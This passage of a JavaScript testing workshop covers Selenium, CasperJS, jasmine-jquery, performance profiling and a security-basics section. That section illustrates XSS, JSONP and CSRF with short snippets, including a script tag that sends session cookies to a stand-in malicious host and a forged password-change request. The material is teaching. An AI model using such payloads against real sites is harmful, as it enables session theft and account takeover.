Notice how the Java code uses Webdriver. 
[Webdriver](http://www.seleniumhq.org/projects/webdriver/) is a compact, 
Object-oriented API for using Selenium programmatically. With Selenium
we can even execute JavaScript code in our tests.

As you can see Selenium can be used regardless the test runner. It's commonly
used in conjunction with JUnit, Cucumber, Fitnesse, Concordion, ...

T>## Advantages of Selenium
T>
T> Mature and stable.
T> Bindings for many programming languages.
T> Integration with Firefox.
T> Easy integration with many tests frameworks.


X>## Run the test from Eclipse
X> 
X> Download [Eclipse](http://www.eclipse.org/downloads/) and Selenium for [Java](http://selenium.googlecode.com/files/selenium-java-2.35.0.zip)
X> Create a new project and include all the downloaded files (.jar).
X> Create a new JUnit test case file in the project.
X> Copy and paste the generated Java code from Selenium IDE to the 
X> file in the project.
X> Run the test with JUnit.


## CasperJS
CasperJS is an open source navigation scripting & testing utility written in 
Javascript for the PhantomJS WebKit headless browser and SlimerJS (Gecko). 
It eases the process of defining a full navigation scenario and provides useful 
high-level functions, methods & syntactic sugar for doing common tasks.

You need to install PhantomJS in order to do the following exercises. CasperJS
is already installed in the project folder. For this workshop we are using
CasperJS version 1.1.0. Once PhantomJS is installed, go to
the "testTheGame" folder and execute  this command:

    $ casperjs/bin/casperjs tests/casperGamePlayer.js

The first one run a test whereas the second is just a script for browser 
automation.

In Casper a script is a sequence of steps executed in the same order they appear
in the script: 

    casper.then(function(){/* ... step 1 ...*/});
    casper.then(function(){/* ... step 2 ...*/});

A step does not start until the previous one has stopped the JavaScript 
execution. Therefore, we know the JavaScript in the steps is executed in 
sequence. This sequential behavior is one of the more handy features.

A> Note that this doesn't apply to asynchronous calls like AJAX.


T>## Advantages of CasperJS/PhantomJS
T>
T> The sequential nature of the scripts.
T> Easy integration with command line tools.
T> The speed of the tests (thanks to PhantomJS).
T> Easy JavaScript injection/execution. 

PhantomJS has two browser contexts, one is the context where the script executes
and the other is the context of the actual page being tested. In order to 
execute JavaScript in the context of the web page, we need to do it through the
"evaluate" function that sends the message over to that context. With CasperJS,
we do it this way:

    casper.thenEvaluate(function(){
         /* this is like opening the console in the browser and type in code: */
         $('#someId').text('testing');
    });

Notice that invoking "console.log" in the web context does not produce any output
in the Casper context:

    casper.thenEvaluate(function(){
         console.log('testing'); // will not print in the command line 
    });

In order to connect the two consoles you have to use the built-in "clientutils"
module:

    casper.thenEvaluate(function(){
        __utils__.echo('testing'); // does print 
    });

For the same reason, variables can't be shared between the two contexts straight
away:

    var someCasperVar = 2;

    casper.thenEvaluate(function(){
        someCasperVar = 5;
    });

    casper.then(function(){
        console.log(someCasperVar); // prints out 2
    });

To work around this, use the __utils__ object.

    var someCasperVar = 2;

    casper.then(function(){
        someCasperVar = this.evaluate(function(){
              return __util__.findAll("div");
        });
        console.log(someCasperVar); // prints out all div nodes in page
    });

There are two ways of using CasperJS in the current version. One is to
write scripts (automate the browser) and the other is to write tests with 
assertions (automate the browser and make assertions).
This is the structure of a test:

    casper.test.begin('Name of the scenario', N, function suite(test) {
        casper.start(URL, function(){
        });

        casper.run(function(){
          test.done();
        });
    });

N is the number of assertions in the scenario. It N doesn't match with the
name of assertions Casper will show a warning in the console.

X>## Run and modify the tests
X> 
X> Run the tests first:
X>     $ casperjs/bin/casperjs test tests/casperTests.js   
X> 
X> In the file *"tests/casperTests.js"* there are questions in comments
X> in the code. Can you answer those questions?
X> Rename the file index2.html to index.html and run the tests again.
X> Why are they failing?

X>## Automate the game player
X> 
X> Write a CasperJS script to be the fastest clicker ever.
X> This exercise will help you understand the asynchronous nature of AJAX. 


X>## Use Casper to send chat messages
X>
X> Create a Casper script to send messages to a user in LiveTeamApp
X> API: xplive.App.teamCommunicator.sendMessage(msg).to("Bob");
X> Then debug the application to find out how to send messages to the team chat.


## Integration tests with Jasmine, jQuery and the DOM
There are several ways to test the GUI apart from the end-to-end tests we've
seen before. Sometimes we just want to test that elements are present or have
some properties and that event handlers are properly wired up. 

On way is to load the actual application within an iframe using the runner html
file as the parent window. Then we can access items in the iframe and make
assertions. Another way is to use libraries like 
[jasmine-jquery](https://github.com/velesin/jasmine-jquery) as we do 
in here.
This library includes matchers to make assertions on elements using jQuery
selectors. Moreover it contains the functionality to inject the target html
template (snippet) into the DOM of the test runner. 

X>## Run the tests and review the files
X>
X> To run the tests open the browser and go here: 
X> http://localhost:3000/tests/runner.html
X> Open domIntegrationSpec.js, runner.html and fixture.html under
X> the test folder. There are hidden koans in the form
X> of comments in the files. Can you understand the files and
X> answer the questions?

Q>## Why do we need the server?
Q>
Q> As you can see, integration tests are being run using
Q> the local web server. Why can't we just run them by opening the
Q> html file in the browser? Try to do it and understand why 
Q> it doesn't work.


# Fast and isolated tests with doubles: Stubs, Mocks and Spies

A> This session is pending, sorry...

## Stubs

## Mocks

## Spies


# Code quality tools

## JSHint

## Code coverage

### Karma + Instanbul

* http://ariya.ofilabs.com/2013/10/code-coverage-of-jasmine-tests-using-istanbul-and-karma.html

### Blanket.js


# Hunting memory leaks

A> This session is pending, sorry... in the meanwhile check this out

* https://github.com/gonzaloruizdevilla/debuggingmemory
* https://developers.google.com/chrome-developer-tools/docs/timeline
* https://developers.google.com/chrome-developer-tools/docs/heap-profiling
* https://developers.google.com/chrome-developer-tools/docs/heap-profiling-dom-leaks#top


# Performance tips
The DOM in general is not as slow as some people think. However there are certain 
operations that take a lot of time. They are usually operations involving the
creation or deletion of nodes in the page. Operations like querying for 
node attributes are very fast. Libraries like jQuery are optimized 
to search for DOM elements, but if we have a long loop, we should save time 
by keeping copies to DOM references in variables rather than querying on 
each iteration.

T>## Watch out for loops 
T>
T> If they involve heavy DOM operations like 
T> the creation/deletion of nodes in the page.

Heavy loops might freeze the GUI for a few seconds prejudicing user experience.
To keep the GUI alive, long operations should be done asynchronously using
timers (*"setTimeout"* and *"setInterval"*) or [Web Workers](http://www.whatwg.org/specs/web-apps/current-work/multipage/workers.html).

## Measuring performance
How long does it take for the application to handle a certain event like a button 
click? How long does it take to paint certain area of the screen?

Developer tools for Chrome come already with profiling support. Just go to
the "Profiling" tab, mark "Collect JavaScript CPU Profile" and click on "Run".
Use the application for a while and stop. You'll see what functions are more
CPU consuming.

Apart from the built-in profiling support, 
[Speed Tracer](https://developers.google.com/web-toolkit/speedtracer/get-started?csw=1) is a comprehensive profiling plugin for Chrome. 

![Speed tracer](images/speed_tracker.png) 

Once installed, Speed Tracer places a green icon at the top right corner in the
browser window. To start recording and measuring just, click the icon whenever you
are in the website you want to check.

X>## Measure with Speed Tracer
X> Go to LiveTeamApp and start recording with Speer Tracer.
X> Find out how long does it take for the application to start or stop
X> a task. 

## Benchmarking
There are several tools to compare the performance of certain code. One is the
library [Benchmarkjs](http://benchmarkjs.com). There are also online sites
like [jsperf.com](http://jsperf.com/) offering benchmarking utilities.


# Security basics
This is not a security guide. This is just a very brief overview of the 
main security issues that every developer and tester must be aware of.

If an external source can inject JavaScript into your page, it's
compromised, your site is no longer secure. The basic rule of thumb to
add security in the front-end is to sanitize all user input rejecting any JavaScript.
Also notice that with JavaScript, the source code is on the page visible to
anyone, so you can't keep an algorithm secret. There are tools to obscure the
code but there are also tools to make it "readable" again. If the implementation
have to be confidential, don't use JavaScript for it.

The basic rule of thumb for security in the server side is to consider
all input malicious until proven valid. Any input data like JSON must
be examined and validated.

## Cookies
Browsers don't allow JavaScript to read cookies from other domains for 
security reasons. There is no JavaScript you can write to access cookies
from other sites stored in the local machine. 
So the majority of the attempts to steal cookies will come 
from your own site, mostly in the form of XSS attacks, with JavaScript
code injected in the page. CSRF attacks are another hazard that we'll
see later but they have to do more with the server side.

You have to make sure that information 
contained within cookies is encrypted in a way that only the server side
can decrypt it. If the cookie is being decrypted with JavaScript in the browser, 
you are giving the access key to any person navigation through your site, even if 
the JavaScript is obfuscated. 
Security can't be handled in the browser. You can have some data validation in
the browser but notice that its purpose is not to provide security, it's to provide
fast feedback enhancing user experience.

If the site uses cookies that are intended to be managed by the server side
exclusively, you must add the [HttpOnly](https://www.owasp.org/index.php/HttpOnly) 
flag to your cookies. This is a flag added by the server when it creates cookies
and tells the browser not to let JavaScript code access it. 

## XSS: Cross-site scripting.
XSS attacks exploit the belief that servers render pages we can trust, which might
not be true, thus becoming the target of the attack.

Think of a forum where I can post messages. If I could insert JavaScript within my
message and the site doesn't avoid it, when any other logged-in user accesses the 
forum and read my message, the JavaScript code will be executed. That JavaScript
code can be malicious. It will operate under the identify of the logged user,
on his behalf. 
The user's session token might be contained within
the cookies, so the malicious code could send it to a remote server and use it
to log in and change the password. Or it can try any type of CSRF attacks.

As an example, if I could insert the following snipped into a posted message, 
the browser would redirect all users loading it to another site, immediately.

    <script> window.location = "http://some-other-site.com"; </script>

When a user can insert JavaScript in a page that others will load later, 
door is open to all kind of attacks, the site is seriously compromised.
No long ago, Twitter had this problem, JavaScript could be inserted on tweets.

A basic technique to secure input against XSS is to replace "<" and ">" symbols
with "lt;" and "gt;" so that "<script>" would turn into "lt;scriptgt;" 
but this is not enough for all cases. The OWASP guide provides more information
on [how to avoid](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) XSS attacks.

## The same-origin policy.
So if I made my way to inject JavaScript into the forum, can I just send
user's session cookies to my malicious server via AJAX?

AJAX is a way to send data from the browser to the server side using JavaScript.
It looks like I could post cookies to a remote
server somewhere. For this reason, browsers cancel any message sent to domains
other than the one serving the page. 

AJAX requests are only allowed to the same domain that served the page.

However, it is still possible to send data via JavaScript with JSONP, 
CORS (Cross-Origin Request Sharing) or older techniques like changing 
"window.location" or "form.submit()".

## JSONP
The same-origin policy don't allow you to send or receive data from different 
domains using AJAX, but you can still
insert scripts on the page, coming from other domains, using the "script" tag.

    <script type="application/javascript"
        src="http://server2.example.com/Users/1234">
    </script>

As long as the url returns valid JavaScript, it will be interpreted by the
browser once it's loaded. Given that you
can generate script tags dynamically with JavaScript, it means you can request
blocks of JavaScript from other domains on the fly. The response can't be JSON,
it must be JavaScript. The trick to get JSON is to send object literals wrapped
in a function call:

    someFunc({someProperty: 'literal'});

The function "someFunc" has to be present in the browser, otherwise JavaScript
will raise an error when trying to execute this response from the remote domain.

All you have to do is make that function exist to get the object literal from the
remote domain, so that you can process it. This is what JSONP libraries do
underneath. When you invoke something like:

    jsonp_lib({url: 'http://someRemoteServer/giveMe/userData/123',
             success: userDataHandler});

It creates a script tag with that url in the "src" attribute, typically adding
the callback function as a parameter:

    http://someRemoteServer/giveMe/userData/123?jsonp=someFunc

Then the server knows it has to return an object literal wrapped up in the someFun
callback, returning something like this:

    someFunc({userId: 123, userName: 'John'});

Now the library, inside the someFunc function calls your code back (userDataHandler),
passing in the retrieved object literal.

An XSS attack could generate a script tag into your page, making a call to a remote
server sending sensible information:

    <script type="application/javascript"
        src="http://malicious-server.example.com/session-cookie/xxxxxx">
    </script>

Where xxxxx is the cookie information read using JavaScript.


## CSRF: Cross-site request forgery.
CSRF attacks exploit the belief that servers can trust clients/users which might not 
be true, thus becoming the target for attacks.

Imagine that I made my way to inject JavaScript into the forum. Now imagine that
Gmail had a RESTful API to change passwords (which is not the case). And imagine the
user has two tabs opened in the browser. One is logged-in at Gmail and the other
visits the forum. If the malicious JavaScript was something like this:

    <script src="http://gmail.com/changePassword?newPassword=hacked"></script>

As the user is logged-in, the browser sends the session cookie to Gmail and, 
if they didn't check the referer but only the session cookie, they would change the
password. Of course, this is not the case with Gmail, it's just an example to
illustrate what is CSRF.

The idea is making requests to other sites that might trust them, believing that
it was the user who ordered the operations. A basic technique to protect the
server against CSRF is validating the Referer and Origin headers. For more
information visit the OWASP [Cheat Sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#CSRF_Prevention_without_a_Synchronizer_Token)

## Sending malicious JSON data.  
Logged users may be dangerous too. Specially because there is no way to crypt
the JSON data sent to the server (it can be, but also decrypted). So a logged 
user can open the console and see that a certain operation sends this JSON:

    {userId:777, newScore: 888}

Where 777 is it's own identifier. Then he may try to change other users by
sending a request to the same url with this JSON:

    {userId:555, newScore: 0}

This is the reason why the security has to be in implemented in the server side.

X>## Make other users loose
X> 
X> Use our "test the game" to impersonate other users by setting their score
X> to zero.

## Sniffing network messages.
The "Network" tab within Developer Tools sniffs all the incoming and
outgoing traffic. No matter whether it is HTTP or Websockets. 
Websockets use channels to send data and sometimes messages between certain
users may be broadcasted over the channel reaching users not involved
in the conversation. This is the default behavior of the popular Socket.io
library. 

X>## Sniffing the chat
X>
X> The current version of LiveTeamApp exposes a security issue regarding
X> the chat which uses Websockets.
X> What kind of information can you sniff?





# References

* Book: Testable JavaScript - Mark Ethan Trostler - O'Reilly Media (ISBN 10:1-4493-2339-1)
* Book: JavaScript Allongé - Reginal Braithwaite - [Leanpub](https://leanpub.com/javascript-allonge)
* Book: JavaScript: The Good Parts - Douglas Crockford - O'Reilly Media (ISBN: 978-0-596-51774-8)
* Presentation: Categorizing Values - Axel Rauchsmayer - [Speakerdeck](https://speakerdeck.com/rauschma/categorizing-values-typeof-instanceof-and-beyond)

